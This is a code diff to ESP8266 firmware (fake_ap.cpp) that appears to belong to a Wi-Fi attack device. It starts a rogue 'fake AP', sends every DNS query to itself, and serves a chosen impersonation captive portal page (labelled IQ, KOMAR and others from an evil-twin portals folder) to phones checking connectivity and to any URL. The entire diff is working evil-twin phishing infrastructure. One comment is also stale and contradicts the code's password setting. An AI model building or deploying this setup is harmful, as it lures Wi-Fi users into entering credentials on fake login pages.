@@ -6,9 +6,10 @@
 #include <ESP8266WebServer.h> // For WebServer
 #include <Adafruit_SSD1306.h> // Include for display usage
 #include <Adafruit_GFX.h> // Include for display usage
-#include "../../bitmaps/beegyoshi.h"
+#include "../../bitmaps/beegyoshi.h" // Ensure this header file defines beegyoshiBitmap
 #include "../../bitmaps/kawaski.h"
 #include "../evil_twin/captive_portal/portals/portals.h"
+
 
 // External variables - Declarations (these are DEFINED in main.cpp)
 extern DNSServer dnsServer;
@@ -19,6 +20,11 @@ extern String captivePortalPage;
 extern bool fakeAPEnabled;
 extern Adafruit_SSD1306 display;
 String cp;
+IPAddress apIP(192, 168, 1, 1);
+
+void handleRoot(){
+    webServer.send(200, "text/html", cp);
+}
 
 void displayBeegYoshiBitmap() {
     Serial.println("Displaying BeegYoshi Bitmap from fake_ap.cpp");
@@ -62,40 +68,55 @@ void startFakeAP() {
         Serial.println("Fake AP already enabled, ignoring start request from fake_ap.cpp.");
         return; // Do not restart if already enabled
     }
-    displayKawaskiBitmap();
-    Serial.println("Starting Fake AP from fake_ap.cpp...");
-    WiFi.mode(WIFI_AP);
-    WiFi.softAP(apSSID, apPassword, 1, 0, 4);  // Start AP with no password, channel 1, hidden SSID, max 4 connections
-    Serial.print("Fake AP Started. SSID: ");
-    Serial.println(apSSID);
-    Serial.print("Fake AP Started. IP Address: ");
-    Serial.println(WiFi.softAPIP());
-    dnsServer.start(53, "*", WiFi.softAPIP());
+    else {
 
-    if (portalIndex == 0) {
-        cp = IQcaptivePortalPage;
-    } else if (portalIndex == 1) {
-        cp = KOMARcaptivePortalPage;
-    } else if (portalIndex == 2) {
-        cp = MYKOMARcaptivePortalPage;
-    } else {
-        cp = captivePortalPage;
-    }
+        displayKawaskiBitmap();
+        WiFi.mode(WIFI_AP);
+        WiFi.softAP(apSSID, "12345678");  // Start AP with no password, channel 1, hidden SSID, max 4 connections
 
-    webServer.on("/", HTTP_GET, []() {
-        webServer.send(200, "text/html", cp);
-    });
-    webServer.begin();
-    fakeAPEnabled = true; // Set flag to enabled
-    Serial.println("FakeAPEnabled set to true in fake_ap.cpp");
+        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0)); // Set IP range for AP
 
-    // Handle clients
-    while (fakeAPEnabled) {
-        dnsServer.processNextRequest();
-        webServer.handleClient();
-        delay(10); // Small delay to prevent watchdog reset
+
+        Serial.print("Fake AP Started. SSID: ");
+        Serial.println(apSSID);
+        Serial.print("Fake AP Started. IP Address: ");
+        Serial.println(WiFi.softAPIP());
+        dnsServer.start(53, "*", apIP);
+
+        delay(100);
+
+        if (portalIndex == 0) {
+            cp = IQcaptivePortalPage;
+        } else if (portalIndex == 1) {
+            cp = KOMARcaptivePortalPage;
+        } else if (portalIndex == 2) {
+            cp = MYKOMARcaptivePortalPage;
+        } else {
+            cp = captivePortalPage;
+        }
+
+        webServer.on("/",handleRoot);
+        webServer.on("/generate_204", handleRoot);  // Android
+        webServer.on("/hotspot-detect.html", handleRoot); // Apple
+        webServer.on("/redirect", handleRoot);
+        webServer.onNotFound(handleRoot);
+        webServer.begin();
+        Serial.println("FakeAPEnabled set to true in fake_ap.cpp");
+
+        fakeAPEnabled = true; // Set flag to enabled
+        Serial.println("Starting Fake AP from fake_ap.cpp...");
     }
 }
+
+void loopAP() {
+    
+    // Handle clients
+    dnsServer.processNextRequest();
+    webServer.handleClient();
+    delay(10); // Small delay to prevent watchdog reset
+}
+
+
 
 // Stop Fake Access Point
 void stopFakeAP() {
